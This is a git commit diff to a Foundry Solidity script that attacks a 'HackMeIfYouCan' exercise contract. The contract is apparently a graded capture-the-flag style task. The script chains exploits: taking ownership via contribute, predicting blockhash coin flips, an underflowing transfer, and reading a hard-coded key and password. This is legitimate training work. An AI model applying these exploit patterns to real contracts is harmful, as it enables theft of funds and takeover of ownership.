0c62f9331473a331abc19c278bae96da2b1f627c
Malthus Ronaldo Djatche <djatchemalthus@gmail.com>
2024-07-22 13:47:20 +0200

    partiels

--- script/AttaqHackMeIfYouCan.s.sol
+++ script/AttaqHackMeIfYouCan.s.sol
@@ -6,68 +6,60 @@ import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
 import "forge-std/console.sol";
 
 
-
-// contract FakeBuilding is Building {
-//     function isLastFloor(uint256) external pure returns (bool) {
-//         return true;
-//     }
-// }
-
 contract AttackHackMeIfYouCan is Script {
 
      HackMeIfYouCan public hackMeIfYouCanContract;
 
-        hackMeContract = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));
-
-
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+         hackMeIfYouCanContract = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));
+
 
         // j'attaque contribute
         console.log("Attaque de contribute...");
-        hackMeContract.contribute{value: 0.0001 ether}();
-        console.log("New Owner: ", hackMeContract.owner());
+        hackMeIfYouCanContract.contribute{value: 0.0001 ether}();
+        console.log("New Owner: ", hackMeIfYouCanContract.owner());
 
-        (bool sent,) = address(hackMeContract).call{value: 1 wei}("");
+        (bool sent,) = address(hackMeIfYouCanContract).call{value: 1 wei}("");
         require(sent, "failled");
-        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        console.log("Marque : ", hackMeIfYouCanContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         // j'attaque flip
         console.log("Attaque de flip...");
         for (uint i = 0; i < 10; i++) {
             uint256 blockValue = uint256(blockhash(block.number - 1));
-            uint256 coinFlip = blockValue / hackMeContract.FACTOR();
+            uint256 coinFlip = blockValue / hackMeIfYouCanContract.FACTOR();
             bool guess = coinFlip == 1 ? true : false;
-            hackMeContract.flip(guess);
+            hackMeIfYouCanContract.flip(guess);
         }
-        console.log("Victoires : ", hackMeContract.getConsecutiveWins(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        console.log("Victoires : ", hackMeIfYouCanContract.getConsecutiveWins(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         // j'attaque addPoint
         console.log("Attaque de addPoint...");
-        hackMeContract.addPoint();
-        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        hackMeIfYouCanContract.addPoint();
+        console.log("Marque : ", hackMeIfYouCanContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         // j'attaque transfer
         console.log("Attaque de transfer...");
-        hackMeContract.transfer(vm.addr(vm.envUint("PRIVATE_KEY")), 1000001);
-        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        hackMeIfYouCanContract.transfer(vm.addr(vm.envUint("PRIVATE_KEY")), 1000001);
+        console.log("Marque : ", hackMeIfYouCanContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         // j'attaque goTo
         console.log("Attaque de goTo...");
-        hackMeContract.goTo(10);
-        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        hackMeIfYouCanContract.goTo(10);
+        console.log("Marque : ", hackMeIfYouCanContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         // j'attaque sendKey
         console.log("Attaque de sendKey...");
         bytes16 correctKey = bytes16(abi.encodePacked(uint256(0)));
-        hackMeContract.sendKey(correctKey);
-        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        hackMeIfYouCanContract.sendKey(correctKey);
+        console.log("Marque : ", hackMeIfYouCanContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         // j'attaque sendPassword
         console.log("Attaque de sendPassword...");
         bytes32 correctPassword = keccak256("malthus");
-        hackMeContract.sendPassword(correctPassword);
-        console.log("Marque : ", hackMeContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
+        hackMeIfYouCanContract.sendPassword(correctPassword);
+        console.log("Marque : ", hackMeIfYouCanContract.getMarks(vm.addr(vm.envUint("PRIVATE_KEY"))));
 
         vm.stopBroadcast();
     }
